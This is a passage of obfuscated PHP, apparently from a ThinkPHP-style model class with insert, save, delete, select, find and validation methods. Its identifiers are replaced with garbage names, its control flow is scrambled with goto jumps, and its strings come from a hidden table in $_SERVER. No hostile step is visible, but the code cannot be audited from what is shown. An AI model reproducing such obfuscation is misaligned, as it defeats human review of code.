$aöíÕˆëñ²[] = $Fª×÷½Ú½»; if (method_exists($this, $fÚ’ì½†ƒÓ[262])) { $EÅƒ´ù¾ÙÄ = call_user_func_array(array($this, $fÚ’ì½†ƒÓ[263]), array($fòÉò÷”·Û, $aöíÕˆëñ²)); if (!is_null($EÅƒ´ù¾ÙÄ) && $EÅƒ´ù¾ÙÄ !== !1) { return $EÅƒ´ù¾ÙÄ; } } goto E—áÉŸÙÕ±; E¶â¯Ş´¼£: $fòÉò÷”·Û = $Fª×÷½Ú½»; if (is_array($Fª×÷½Ú½»)) { $fòÉò÷”·Û = $Fª×÷½Ú½»[1]; $Fª×÷½Ú½» = $Fª×÷½Ú½»[0]; } $C¯ÅÕÓ¹Úæ = count($aöíÕˆëñ²) - 1; goto D¢¸ë¡»Ì; E—áÉŸÙÕ±: $bˆ†–²¥¤ = call_user_func_array(array($this, $Fª×÷½Ú½»), $aöíÕˆëñ²); if (method_exists($this, $fÚ’ì½†ƒÓ[264])) { $EÅƒ´ù¾ÙÄ = call_user_func_array(array($this, $fÚ’ì½†ƒÓ[265]), array($fòÉò÷”·Û, $aöíÕˆëñ², $bˆ†–²¥¤)); if ($EÅƒ´ù¾ÙÄ) { return $EÅƒ´ù¾ÙÄ; } } return $bˆ†–²¥¤; goto Fß¢ÃÎé“º; Fß¢ÃÎé“º: } protected function _initialize() { } protected function _facade($d¤¼Š˜‰ë ) { $D¦ÎË›ˆÊĞ =& $_SERVER[Š‰]; if (!empty($this->fields)) { foreach ($d¤¼Š˜‰ë  as $fø”¯ÈÌïÀ => $b•õêÇ°éÄ) { if (is_array($this->fields) && !in_array($fø”¯ÈÌïÀ, $this->fields, !0)) { unset($d¤¼Š˜‰ë [$fø”¯ÈÌïÀ]); } elseif (is_scalar($b•õêÇ°éÄ)) { $this->_parseType($d¤¼Š˜‰ë , $fø”¯ÈÌïÀ); } } } if (!empty($this->options[$D¦ÎË›ˆÊĞ[266]])) { $d¤¼Š˜‰ë  = array_map($this->options[$D¦ÎË›ˆÊĞ[266]], $d¤¼Š˜‰ë ); unset($this->options[$D¦ÎË›ˆÊĞ[266]]); } $this->_beforeWrite($d¤¼Š˜‰ë ); return $d¤¼Š˜‰ë ; } protected function _beforeWrite(&$f¬­¯óÚº) { } public function add($a’Á’æÉĞ = '', $F÷¦„ÚÎ‡¡ = array(), $F„¼×ßË‚ƒ = false) { goto AùèÊğ†í¹; bÉÅ¸”÷âÀ: if (!1 === $this->_beforeInsert($a’Á’æÉĞ, $F÷¦„ÚÎ‡¡)) { return !1; } $bˆÎ²“ô±ø = $this->db->insert($a’Á’æÉĞ, $F÷¦„ÚÎ‡¡, $F„¼×ßË‚ƒ); if (!1 !== $bˆÎ²“ô±ø) { $fÌŞ  ÑÑ÷ = $this->getLastInsID(); if ($fÌŞ  ÑÑ÷) { $a’Á’æÉĞ[$this->getPk()] = $fÌŞ  ÑÑ÷; $this->_after_insert($a’Á’æÉĞ, $F÷¦„ÚÎ‡¡); return $fÌŞ  ÑÑ÷; } $this->_after_insert($a’Á’æÉĞ, $F÷¦„ÚÎ‡¡); } goto dğÚôÕ´å®; dğÚôÕ´å®: return $bˆÎ²“ô±ø; goto CËç­ò®…; AùèÊğ†í¹: if (empty($a’Á’æÉĞ)) { if (!empty($this->data)) { $a’Á’æÉĞ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Š‰][267]); return !1; } } $F÷¦„ÚÎ‡¡ = $this->_parseOptions($F÷¦„ÚÎ‡¡); $a’Á’æÉĞ = $this->_facade($a’Á’æÉĞ); goto bÉÅ¸”÷âÀ; CËç­ò®…: } protected function _beforeInsert(&$dò’›™×¿¢, $c‰Ï´ÆÓóé) { } protected function _after_insert($b»Ì‹äÇã, $Cˆ‡È¬¬) { } public function addAll($a’ø¯¸“ôã, $Cš¨±“£‰ñ = array(), $dŸ²à÷”–ô = false) { goto dù£ˆö¨•; A…£‹´Ó: foreach ($a’ø¯¸“ôã as $C˜¶š«„Õä => $DÍ—­š¯¢) { $a’ø¯¸“ôã[$C˜¶š«„Õä] = $this->_facade($DÍ—­š¯¢); } if (method_exists($this->db, $FÓ†Şˆ©ÀÚ[268])) { $DºğÁÖÎ¾Ş = $this->db->insertAll($a’ø¯¸“ôã, $Cš¨±“£‰ñ, $dŸ²à÷”–ô); } else { $this->startTrans(); foreach ($a’ø¯¸“ôã as $C˜¶š«„Õä => $DÍ—­š¯¢) { $DºğÁÖÎ¾Ş = $this->db->insert($DÍ—­š¯¢, $Cš¨±“£‰ñ, $dŸ²à÷”–ô); } $this->commit(); } if (!1 !== $DºğÁÖÎ¾Ş) { $F½¿ä°—ëï = $this->getLastInsID(); if ($F½¿ä°—ëï) { return $F½¿ä°—ëï; } } goto E‰Ô˜æå²; E‰Ô˜æå²: return $DºğÁÖÎ¾Ş; goto EÌœ”ç‰šÏ; dù£ˆö¨•: $FÓ†Şˆ©ÀÚ =& $_SERVER[Š‰]; if (empty($a’ø¯¸“ôã)) { $this->error = think_lang($FÓ†Şˆ©ÀÚ[267]); return !1; } $Cš¨±“£‰ñ = $this->_parseOptions($Cš¨±“£‰ñ); goto A…£‹´Ó; EÌœ”ç‰šÏ: } public function selectAdd($BÆ÷Š¬¶ß» = '', $f¨ã»—Ûù² = '', $dÓ™Â‚§¬ = array()) { $aµ’ÕĞ–œ =& $_SERVER[Š‰]; $dÓ™Â‚§¬ = $this->_parseOptions($dÓ™Â‚§¬); if (!1 === ($eõ¤£à»¸â = $this->db->selectInsert($BÆ÷Š¬¶ß» ? $BÆ÷Š¬¶ß» : $dÓ™Â‚§¬[$aµ’ÕĞ–œ[269]], $f¨ã»—Ûù² ? $f¨ã»—Ûù² : $this->getTableName(), $dÓ™Â‚§¬))) { $this->error = think_lang($aµ’ÕĞ–œ[270]); return !1; } else { return $eõ¤£à»¸â; } } public function save($BËÚÏ÷ªß = '', $Bâ»Õšñ½½ = array()) { goto fŸÉ²çìÕŸ; fŸÉ²çìÕŸ: $BÄŠìÖ‰Å =& $_SERVER[Š‰]; if (empty($BËÚÏ÷ªß)) { if (!empty($this->data)) { $BËÚÏ÷ªß = $this->data; $this->data = array(); } else { $this->error = think_lang($BÄŠìÖ‰Å[267]); return !1; } } $BËÚÏ÷ªß = $this->_facade($BËÚÏ÷ªß); goto B½ÎÆ¥·ã„; Eî«äùœÅ: if (is_array($Bâ»Õšñ½½[$BÄŠìÖ‰Å[271]]) && isset($Bâ»Õšñ½½[$BÄŠìÖ‰Å[271]][$FÚá¸ƒßã])) { $B£ö†Œó® = $Bâ»Õšñ½½[$BÄŠìÖ‰Å[271]][$FÚá¸ƒßã]; } if (!1 === $this->_beforeUpdate($BËÚÏ÷ªß, $Bâ»Õšñ½½)) { return !1; } $c’¾æ‚Ç’† = $this->db->update($BËÚÏ÷ªß, $Bâ»Õšñ½½); goto FÌÅª†ŞÓ«; FÌÅª†ŞÓ«: if (!1 !== $c’¾æ‚Ç’†) { if (isset($B£ö†Œó®)) { $BËÚÏ÷ªß[$FÚá¸ƒßã] = $B£ö†Œó®; } $this->_afterUpdate($BËÚÏ÷ªß, $Bâ»Õšñ½½); } return $c’¾æ‚Ç’†; goto câ¿ ƒ¸ª³; B½ÎÆ¥·ã„: $Bâ»Õšñ½½ = $this->_parseOptions($Bâ»Õšñ½½); $FÚá¸ƒßã = $this->getPk(); if (!isset($Bâ»Õšñ½½[$BÄŠìÖ‰Å[271]])) { if (isset($BËÚÏ÷ªß[$FÚá¸ƒßã])) { $bæô‰Á•ñ¸[$FÚá¸ƒßã] = $BËÚÏ÷ªß[$FÚá¸ƒßã]; $Bâ»Õšñ½½[$BÄŠìÖ‰Å[271]] = $bæô‰Á•ñ¸; unset($BËÚÏ÷ªß[$FÚá¸ƒßã]); } else { $this->error = think_lang($BÄŠìÖ‰Å[270]); return !1; } } goto Eî«äùœÅ; câ¿ ƒ¸ª³: } protected function _beforeUpdate(&$Bó¡èÄµ°×, $fÄğçØÜ‡) { } protected function _afterUpdate($aÃùÇÌ¡Õå, $Aå‘õö–¶) { } public function delete($C—óÆè¨´Å = array()) { goto fÃÛê¾âÆê; fÃÛê¾âÆê: $bÉ‰á   =& $_SERVER[Š‰]; if (empty($C—óÆè¨´Å) && empty($this->options[$bÉ‰á  [271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $eÇÖ×§âœË = $this->getPk(); goto FàøƒÖŸ—«; BœÃ‰å†¾: $CÌõ»Œâõ¬ = $this->db->delete($C—óÆè¨´Å); if (!1 !== $CÌõ»Œâõ¬) { $AÍ™ì¨¡É = array(); if (isset($a­Ê­ŒÛåŸ)) { $AÍ™ì¨¡É[$eÇÖ×§âœË] = $a­Ê­ŒÛåŸ; } $this->_after_delete($AÍ™ì¨¡É, $C—óÆè¨´Å); } return $CÌõ»Œâõ¬; goto B´êˆİëÒ; FàøƒÖŸ—«: if (is_numeric($C—óÆè¨´Å) || is_string($C—óÆè¨´Å)) { if (strpos($C—óÆè¨´Å, $bÉ‰á  [47])) { $bÏãàïª«[$eÇÖ×§âœË] = array($bÉ‰á  [272], $C—óÆè¨´Å); } else { $bÏãàïª«[$eÇÖ×§âœË] = $C—óÆè¨´Å; } $this->options[$bÉ‰á  [271]] = $bÏãàïª«; } $C—óÆè¨´Å = $this->_parseOptions(); if (is_array($C—óÆè¨´Å[$bÉ‰á  [271]]) && isset($C—óÆè¨´Å[$bÉ‰á  [271]][$eÇÖ×§âœË])) { $a­Ê­ŒÛåŸ = $C—óÆè¨´Å[$bÉ‰á  [271]][$eÇÖ×§âœË]; } goto BœÃ‰å†¾; B´êˆİëÒ: } protected function _after_delete($eÈâ»Ë¼™‹, $EÛ²Ê£Ş¡†) { } public function select($B»Ù£ß¯“ = array()) { goto aªÙÉ²‡É; Aâ‡Ú‰–è: $aëö‘Øª¦Ö = $this->db->select($B»Ù£ß¯“); if (!1 === $aëö‘Øª¦Ö) { return !1; } if (empty($aëö‘Øª¦Ö)) { return null; } goto d„Ï†ñ³ó…; d„Ï†ñ³ó…: $this->_afterSelect($aëö‘Øª¦Ö, $B»Ù£ß¯“); return $aëö‘Øª¦Ö; goto F¶ğ¢àŸË„; aªÙÉ²‡É: $A™ª‘ºğ½ =& $_SERVER[Š‰]; if (is_string($B»Ù£ß¯“) || is_numeric($B»Ù£ß¯“)) { $aŠà†œ•ç = $this->getPk(); if (strpos($B»Ù£ß¯“, $A™ª‘ºğ½[47])) { $Fî¤ø´ÑÚ·[$aŠà†œ•ç] = array($A™ª‘ºğ½[272], $B»Ù£ß¯“); } else { $Fî¤ø´ÑÚ·[$aŠà†œ•ç] = $B»Ù£ß¯“; } $this->options[$A™ª‘ºğ½[271]] = $Fî¤ø´ÑÚ·; } elseif (!1 === $B»Ù£ß¯“) { $B»Ù£ß¯“ = $this->_parseOptions(); return $A™ª‘ºğ½[273] . $this->db->buildSelectSql($B»Ù£ß¯“) . $A™ª‘ºğ½[274]; } $B»Ù£ß¯“ = $this->_parseOptions(); goto Aâ‡Ú‰–è; F¶ğ¢àŸË„: } protected function _afterSelect(&$eªØ÷§‹‡, $Dˆì¬Ö†–) { } public function buildSql($f¶ÃÅ±İ = array()) { $DĞ¬Ú“ãí =& $_SERVER[Š‰]; $f¶ÃÅ±İ = $this->_parseOptions($f¶ÃÅ±İ); return $DĞ¬Ú“ãí[273] . $this->db->buildSelectSql($f¶ÃÅ±İ) . $DĞ¬Ú“ãí[274]; } public function optionsValue($Fâ¸Ò²’ˆ´ = null) { if (is_null($Fâ¸Ò²’ˆ´)) { return $this->options; } elseif (is_array($Fâ¸Ò²’ˆ´)) { $this->options = array_merge($this->options, $Fâ¸Ò²’ˆ´); } } protected function _parseOptions($d„†ÇàÈ» = array()) { goto aêõùÕ©¥Ÿ; aêõùÕ©¥Ÿ: $D³¡Ü‰ºÊß =& $_SERVER[Š‰]; if (is_array($d„†ÇàÈ»)) { $d„†ÇàÈ» = array_merge($this->options, $d„†ÇàÈ»); } $this->options = array(); goto bô¾µãÌ÷; bô¾µãÌ÷: if (!isset($d„†ÇàÈ»[$D³¡Ü‰ºÊß[275]])) { $d„†ÇàÈ»[$D³¡Ü‰ºÊß[275]] = $this->getTableName(); $Bà•ó•Ô = $this->fields; } else { $Bà•ó•Ô = $this->getDbFields(); } if (!empty($d„†ÇàÈ»[$D³¡Ü‰ºÊß[276]])) { $d„†ÇàÈ»[$D³¡Ü‰ºÊß[275]] .= $D³¡Ü‰ºÊß[50] . $d„†ÇàÈ»[$D³¡Ü‰ºÊß[276]]; } $d„†ÇàÈ»[$D³¡Ü‰ºÊß[277]] = $this->name; goto EŒùÌáã±; EŒùÌáã±: if (isset($d„†ÇàÈ»[$D³¡Ü‰ºÊß[271]]) && is_array($d„†ÇàÈ»[$D³¡Ü‰ºÊß[271]]) && !empty($Bà•ó•Ô) && !isset($d„†ÇàÈ»[$D³¡Ü‰ºÊß[278]]) && !isset($d„†ÇàÈ»[$D³¡Ü‰ºÊß[275]])) { foreach ($d„†ÇàÈ»[$D³¡Ü‰ºÊß[271]] as $e·öøšŒ => $c³²¥©À´Ù) { $e·öøšŒ = trim($e·öøšŒ); if (in_array($e·öøšŒ, $Bà•ó•Ô, !0)) { if (is_scalar($c³²¥©À´Ù)) { $this->_parseType($d„†ÇàÈ»[$D³¡Ü‰ºÊß[271]], $e·öøšŒ); } } elseif (!is_numeric($e·öøšŒ) && $D³¡Ü‰ºÊß[70] != substr($e·öøšŒ, 0, 1) && !1 === strpos($e·öøšŒ, $D³¡Ü‰ºÊß[94]) && !1 === strpos($e·öøšŒ, $D³¡Ü‰ºÊß[256]) && !1 === strpos($e·öøšŒ, $D³¡Ü‰ºÊß[279]) && !1 === strpos($e·öøšŒ, $D³¡Ü‰ºÊß[280])) { unset($d„†ÇàÈ»[$D³¡Ü‰ºÊß[271]][$e·öøšŒ]); } } } $this->_options_filter($d„†ÇàÈ»); return $d„†ÇàÈ»; goto Dƒ­Ñ•÷ƒù; Dƒ­Ñ•÷ƒù: } protected function _options_filter(&$eÁíª¦âÃÛ) { } protected function _parseType(&$DÛ¿íš–Ôœ, $c´×È‘Í) { $DÌõ¬ƒá·½ =& $_SERVER[Š‰]; if (empty($this->options[$DÌõ¬ƒá·½[281]][$DÌõ¬ƒá·½[4] . $c´×È‘Í])) { $EÎ¨Ì©¨¦ì = strtolower($this->fields[$DÌõ¬ƒá·½[248]][$c´×È‘Í]); if (!1 !== strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[282])) { } elseif (!1 === strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[283]) && !1 !== strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[284])) { $DÛ¿íš–Ôœ[$c´×È‘Í] = intval($DÛ¿íš–Ôœ[$c´×È‘Í]); } elseif (!1 !== strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[285]) || !1 !== strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[286])) { $DÛ¿íš–Ôœ[$c´×È‘Í] = floatval($DÛ¿íš–Ôœ[$c´×È‘Í]); } elseif (!1 !== strpos($EÎ¨Ì©¨¦ì, $DÌõ¬ƒá·½[287])) { $DÛ¿íš–Ôœ[$c´×È‘Í] = (bool) $DÛ¿íš–Ôœ[$c´×È‘Í]; } } } public function find($Fù‹ªò¸ÓÃ = array()) { goto F°ÒÄ‹š»ë; B²×äÔÒ„: if (empty($FØ„ÅïËÏë)) { return null; } $this->data = $FØ„ÅïËÏë[0]; $this->_afterFind($this->data, $Fù‹ªò¸ÓÃ); goto a°–İ‹Í¢; a°–İ‹Í¢: if (!empty($this->options[$EîÒÁù¦Å[289]])) { return $this->returnResult($this->data, $this->options[$EîÒÁù¦Å[289]]); } return $this->data; goto däÖ×›†ÚØ; bÕ×ò‘Ó´«: $Fù‹ªò¸ÓÃ = $this->_parseOptions(); $FØ„ÅïËÏë = $this->db->select($Fù‹ªò¸ÓÃ); if (!1 === $FØ„ÅïËÏë) { return !1; } goto B²×äÔÒ„; F°ÒÄ‹š»ë: $EîÒÁù¦Å =& $_SERVER[Š‰]; if (is_numeric($Fù‹ªò¸ÓÃ) || is_string($Fù‹ªò¸ÓÃ)) { $EÜ¨‚º¥ğ[$this->getPk()] = intval($Fù‹ªò¸ÓÃ); $this->options[$EîÒÁù¦Å[271]] = $EÜ¨‚º¥ğ; } $this->options[$EîÒÁù¦Å[288]] = 1; goto bÕ×ò‘Ó´«; däÖ×›†ÚØ: } protected function _afterFind(&$Aù‹á‰¿½Ø, $f“ˆ¼ùÍŒÎ) { } protected function returnResult($E†Ôó–Ê‘, $AË™¢“·§Š = '') { $F¶ô¬‰“¹È =& $_SERVER[Š‰]; if ($AË™¢“·§Š) { if (is_callable($AË™¢“·§Š)) { return call_user_func($AË™¢“·§Š, $E†Ôó–Ê‘); } switch (strtolower($AË™¢“·§Š)) { case $F¶ô¬‰“¹È[290]: return json_encode($E†Ôó–Ê‘); case $F¶ô¬‰“¹È[291]: return xml_encode($E†Ôó–Ê‘); } } return $E†Ôó–Ê‘; } public function parseFieldsMap($c×ËÇ£ÎŠ, $a£æË¥é“ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $d¦×‚»Ç => $dËŒ¢Î¾­) { if ($a£æË¥é“ == 1) { if (isset($c×ËÇ£ÎŠ[$dËŒ¢Î¾­])) { $c×ËÇ£ÎŠ[$d¦×‚»Ç] = $c×ËÇ£ÎŠ[$dËŒ¢Î¾­]; unset($c×ËÇ£ÎŠ[$dËŒ¢Î¾­]); } } else { if (isset($c×ËÇ£ÎŠ[$d¦×‚»Ç])) { $c×ËÇ£ÎŠ[$dËŒ¢Î¾­] = $c×ËÇ£ÎŠ[$d¦×‚»Ç]; unset($c×ËÇ£ÎŠ[$d¦×‚»Ç]); } } } } return $c×ËÇ£ÎŠ; } public function setField($fÏÆ‰Øİ”ª, $fèòÙï±³§ = '') { if (is_array($fÏÆ‰Øİ”ª)) { $eŞ‹µ´èÍ‡ = $fÏÆ‰Øİ”ª; } else { $eŞ‹µ´èÍ‡[$fÏÆ‰Øİ”ª] = $fèòÙï±³§; } return $this->save($eŞ‹µ´èÍ‡); } public function setAdd($c‡—Ì§¼ì˜, $eƒ¶’ä‡ƒÈ = 1) { $aè¥”²Óé =& $_SERVER[Š‰]; $E†¾ÜªË» = $c‡—Ì§¼ì˜ . $aè¥”²Óé[292] . $eƒ¶’ä‡ƒÈ; if ($eƒ¶’ä‡ƒÈ < 0) { $E†¾ÜªË» = $c‡—Ì§¼ì˜ . $eƒ¶’ä‡ƒÈ; } return $this->setField($c‡—Ì§¼ì˜, array($aè¥”²Óé[293], $E†¾ÜªË»)); } public function getField($EØòó° Úø, $FŒÚ•ç„Ê = null) { $e‹¿­¦œœ =& $_SERVER[Š‰]; $fäçÌ’®Éà[$e‹¿­¦œœ[269]] = $EØòó° Úø; $fäçÌ’®Éà = $this->_parseOptions($fäçÌ’®Éà); $EØòó° Úø = trim($EØòó° Úø); if (strpos($EØòó° Úø, $e‹¿­¦œœ[47])) { if (!isset($fäçÌ’®Éà[$e‹¿­¦œœ[288]])) { $fäçÌ’®Éà[$e‹¿­¦œœ[288]] = is_numeric($FŒÚ•ç„Ê) ? $FŒÚ•ç„Ê : $e‹¿­¦œœ[33]; } $AÙèõƒÇóÇ = $this->db->select($fäçÌ’®Éà); if (!empty($AÙèõƒÇóÇ)) { goto DíÃ½‡’’É; E×çÊï—¤: $bŠË‘®¢Å© = array_shift($EØòó° Úø); $E„ÕÈ¯“½ = array(); $B«±‚ùòå† = count($eÉœÇ¸°ÓÖ); goto c±¬îÂˆêÏ; c±¬îÂˆêÏ: foreach ($AÙèõƒÇóÇ as $CÍ¤øÙ‚Îº) { $e‘Ş¡É†Şì = $CÍ¤øÙ‚Îº[$fŸËá‘¥½]; if (2 == $B«±‚ùòå†) { $E„ÕÈ¯“½[$e‘Ş¡É†Şì] = $CÍ¤øÙ‚Îº[$bŠË‘®¢Å©]; } else { $E„ÕÈ¯“½[$e‘Ş¡É†Şì] = is_string($FŒÚ•ç„Ê) ? implode($FŒÚ•ç„Ê, $CÍ¤øÙ‚Îº) : $CÍ¤øÙ‚Îº; } } return $E„ÕÈ¯“½; goto C×ÊŒƒÒÙ; DíÃ½‡’’É: $eÉœÇ¸°ÓÖ = explode($e‹¿­¦œœ[47], $EØòó° Úø); $EØòó° Úø = array_keys($AÙèõƒÇóÇ[0]); $fŸËá‘¥½ = array_shift($EØòó° Úø); goto E×çÊï—¤; C×ÊŒƒÒÙ: } } else { if (!0 !== $FŒÚ•ç„Ê) { $fäçÌ’®Éà[$e‹¿­¦œœ[288]] = is_numeric($FŒÚ•ç„Ê) ? $FŒÚ•ç„Ê : 1; } if ($FŒÚ•ç„Ê === $e‹¿­¦œœ[251]) { unset($fäçÌ’®Éà[$e‹¿­¦œœ[288]]); } $CÍ¤øÙ‚Îº = $this->db->select($fäçÌ’®Éà); if (!empty($CÍ¤øÙ‚Îº)) { if ($FŒÚ•ç„Ê === $e‹¿­¦œœ[251]) { return reset($CÍ¤øÙ‚Îº[0]); } if (!0 !== $FŒÚ•ç„Ê && 1 == $fäçÌ’®Éà[$e‹¿­¦œœ[288]]) { return reset($CÍ¤øÙ‚Îº[0]); } foreach ($CÍ¤øÙ‚Îº as $fÀ“ôËİ©÷) { $cŠŞ µ²æ¿[] = $fÀ“ôËİ©÷[$EØòó° Úø]; } return $cŠŞ µ²æ¿; } } return null; } public function create($EÎµ¼«Æ¬ = '', $fÇ˜Õíº = '') { goto fã”à µéÙ; A’÷ùÃÃĞ¥: if ($this->autoCheckFields) { $C·›¬·•à = $this->getDbFields(); foreach ($EÎµ¼«Æ¬ as $d·ª™ÊíÛ™ => $cæµ°³ÅÓŒ) { if (!in_array($d·ª™ÊíÛ™, $C·›¬·•à)) { unset($EÎµ¼«Æ¬[$d·ª™ÊíÛ™]); } elseif (MAGIC_QUOTES_GPC && is_string($cæµ°³ÅÓŒ)) { $EÎµ¼«Æ¬[$d·ª™ÊíÛ™] = stripslashes($cæµ°³ÅÓŒ); } } } $this->autoOperation($EÎµ¼«Æ¬, $fÇ˜Õíº); $this->data = $EÎµ¼«Æ¬; goto a£©§ÌÁ¾½; a£©§ÌÁ¾½: return $EÎµ¼«Æ¬; goto e¾é’°†‹’; fÈÕåì›: if (isset($C·›¬·•à)) { if (is_string($C·›¬·•à)) { $C·›¬·•à = explode($DÜßò‹æˆ[47], $C·›¬·•à); } if (think_config($DÜßò‹æˆ[294])) { $C·›¬·•à[] = think_config($DÜßò‹æˆ[295]); } foreach ($EÎµ¼«Æ¬ as $d·ª™ÊíÛ™ => $cæµ°³ÅÓŒ) { if (!in_array($d·ª™ÊíÛ™, $C·›¬·•à)) { unset($EÎµ¼«Æ¬[$d·ª™ÊíÛ™]); } } } if (!$this->autoValidation($EÎµ¼«Æ¬, $fÇ˜Õíº)) { return !1; } if (!$this->autoCheckToken($EÎµ¼«Æ¬)) { $this->error = think_lang($DÜßò‹æˆ[296]); return !1; } goto A’÷ùÃÃĞ¥; D¦íÅ”®–º: $EÎµ¼«Æ¬ = $this->parseFieldsMap($EÎµ¼«Æ¬, 0); $fÇ˜Õíº = $fÇ˜Õíº ? $fÇ˜Õíº : (!empty($EÎµ¼«Æ¬[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$DÜßò‹æˆ[269]])) { $C·›¬·•à = $this->options[$DÜßò‹æˆ[269]]; unset($this->options[$DÜßò‹æˆ[269]]); } elseif ($fÇ˜Õíº == THINK_MODEL_INSERT && isset($this->insertFields)) { $C·›¬·•à = $this->insertFields; } elseif ($fÇ˜Õíº == THINK_MODEL_UPDATE && isset($this->updateFields)) { $C·›¬·•à = $this->updateFields; } goto fÈÕåì›; fã”à µéÙ: $DÜßò‹æˆ =& $_SERVER[Š‰]; if (empty($EÎµ¼«Æ¬)) { $EÎµ¼«Æ¬ = $_POST; } elseif (is_object($EÎµ¼«Æ¬)) { $EÎµ¼«Æ¬ = get_object_vars($EÎµ¼«Æ¬); } if (empty($EÎµ¼«Æ¬) || !is_array($EÎµ¼«Æ¬)) { $this->error = think_lang($DÜßò‹æˆ[267]); return !1; } goto D¦íÅ”®–º; e¾é’°†‹’: } public function autoCheckToken($C´¼ÔŸ–ÕÂ) { $d¨ÔÑ§Ë¤ =& $_SERVER[Š‰]; if (isset($this->options[$d¨ÔÑ§Ë¤[297]]) && !$this->options[$d¨ÔÑ§Ë¤[297]]) { return !0; } if (think_config($d¨ÔÑ§Ë¤[294])) { $AŞÕ Ö–™† = think_config($d¨ÔÑ§Ë¤[295]); if (!isset($C´¼ÔŸ–ÕÂ[$AŞÕ Ö–™†]) || Session::get($AŞÕ Ö–™†)) { return !1; } list($E•ÒÖ»Øå, $C´‘Îèê¢Û) = explode($d¨ÔÑ§Ë¤[70], $C´¼ÔŸ–ÕÂ[$AŞÕ Ö–™†]); if ($C´‘Îèê¢Û && Session::get($AŞÕ Ö–™† . $d¨ÔÑ§Ë¤[94] . $E•ÒÖ»Øå) === $C´‘Îèê¢Û) { Session::remove($AŞÕ Ö–™† . $d¨ÔÑ§Ë¤[94] . $E•ÒÖ»Øå); return !0; } if (think_config($d¨ÔÑ§Ë¤[298])) { Session::remove($AŞÕ Ö–™† . $d¨ÔÑ§Ë¤[94] . $E•ÒÖ»Øå); } return !1; } return !0; } public function regex($e¨Ì‡« Ä„, $fõ¬™‘ÎÙõ) { $b¯«£ÅŒ’– =& $_SERVER[Š‰]; $FİÌ¦„— = array($b¯«£ÅŒ’–[299] => $b¯«£ÅŒ’–[300], $b¯«£ÅŒ’–[301] => $b¯«£ÅŒ’–[302], $b¯«£ÅŒ’–[303] => $b¯«£ÅŒ’–[304], $b¯«£ÅŒ’–[305] => $b¯«£ÅŒ’–[306], $b¯«£ÅŒ’–[307] => $b¯«£ÅŒ’–[308], $b¯«£ÅŒ’–[309] => $b¯«£ÅŒ’–[310], $b¯«£ÅŒ’–[311] => $b¯«£ÅŒ’–[312], $b¯«£ÅŒ’–[286] => $b¯«£ÅŒ’–[313], $b¯«£ÅŒ’–[314] => $b¯«£ÅŒ’–[315]); if (isset($FİÌ¦„—[strtolower($fõ¬™‘ÎÙõ)])) { $fõ¬™‘ÎÙõ = $FİÌ¦„—[strtolower($fõ¬™‘ÎÙõ)]; } return preg_match($fõ¬™‘ÎÙõ, $e¨Ì‡« Ä„) === 1; } private function autoOperation(&$B„Î¬ØÆÈï, $d‰Ä…±­°) { $A»Üè°ö =& $_SERVER[Š‰]; if (!empty($this->options[$A»Üè°ö[316]])) { $B‚óÌ×Ì¶· = $this->options[$A»Üè°ö[316]]; unset($this->options[$A»Üè°ö[316]]); } elseif (!empty($this->_auto)) { $B‚óÌ×Ì¶· = $this->_auto; } if (isset($B‚óÌ×Ì¶·)) { foreach ($B‚óÌ×Ì¶· as $e‚¼õÃˆĞ°) { if (empty($e‚¼õÃˆĞ°[2])) { $e‚¼õÃˆĞ°[2] = THINK_MODEL_INSERT; } if ($d‰Ä…±­° == $e‚¼õÃˆĞ°[2] || $e‚¼õÃˆĞ°[2] == THINK_MODEL_BOTH) { switch (trim($e‚¼õÃˆĞ°[3])) { case $A»Üè°ö[317]: case $A»Üè°ö[318]: $e‹×‰ôìß³ = isset($e‚¼õÃˆĞ°[4]) ? (array) $e‚¼õÃˆĞ°[4] : array(); if (isset($B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]])) { array_unshift($e‹×‰ôìß³, $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]]); } if ($A»Üè°ö[317] == $e‚¼õÃˆĞ°[3]) { $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]] = call_user_func_array($e‚¼õÃˆĞ°[1], $e‹×‰ôìß³); } else { $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]] = call_user_func_array(array(&$this, $e‚¼õÃˆĞ°[1]), $e‹×‰ôìß³); } break; case $A»Üè°ö[269]: $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]] = $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[1]]; break; case $A»Üè°ö[319]: if ($A»Üè°ö[33] === $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]]) { unset($B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]]); } break; case $A»Üè°ö[320]: default: $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]] = $e‚¼õÃˆĞ°[1]; } if (!1 === $B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]]) { unset($B„Î¬ØÆÈï[$e‚¼õÃˆĞ°[0]]); } } } } return $B„Î¬ØÆÈï; } protected function autoValidation($D·Ö¾‚ÛÅ®, $BŞÇ¤º¨µÁ) { $bİóĞ•ô†¾ =& $_SERVER[Š‰]; if (!empty($this->options[$bİóĞ•ô†¾[321]])) { $eÕ‘¾ë °¡ = $this->options[$bİóĞ•ô†¾[321]]; unset($this->options[$bİóĞ•ô†¾[321]]); } elseif (!empty($this->_validate)) { $eÕ‘¾ë °¡ = $this->_validate; } if (isset($eÕ‘¾ë °¡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($eÕ‘¾ë °¡ as $aÆ³Ô‹åÚß => $F™‚ÅâŸÎö) { if (empty($F™‚ÅâŸÎö[5]) || $F™‚ÅâŸÎö[5] == THINK_MODEL_BOTH || $F™‚ÅâŸÎö[5] == $BŞÇ¤º¨µÁ) { if (0 == strpos($F™‚ÅâŸÎö[2], $bİóĞ•ô†¾[322]) && strpos($F™‚ÅâŸÎö[2], $bİóĞ•ô†¾[323])) { 